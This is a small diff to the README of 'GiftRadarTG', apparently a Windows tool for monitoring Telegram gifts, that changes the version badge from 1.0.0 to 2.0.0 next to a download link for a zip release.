@@ -10,7 +10,7 @@ GiftRadarTG is a powerful tool for discovering, analyzing, monitoring, and track
 [![DOWNLOAD](https://img.shields.io/badge/⬇_DOWNLOAD-GiftRadarTG-blue?style=for-the-badge&logo=github)](https://github.com/FigureGiraffe24/GiftRadarTG/releases/download/v1.00/GiftRadar.zip)
 ![Status](https://img.shields.io/badge/STATUS-STABLE-brightgreen?style=for-the-badge)
 ![Telegram](https://img.shields.io/badge/TELEGRAM-MONITORING-orange?style=for-the-badge)
-![Version](https://img.shields.io/badge/VERSION-1.0.0-purple?style=for-the-badge)
+![Version](https://img.shields.io/badge/VERSION-2.0.0-purple?style=for-the-badge)
 ![Platform](https://img.shields.io/badge/PLATFORM-WINDOWS%2010%2F11-lightgrey?style=for-the-badge)
 
 ## ⚡ Why GiftRadarTG?
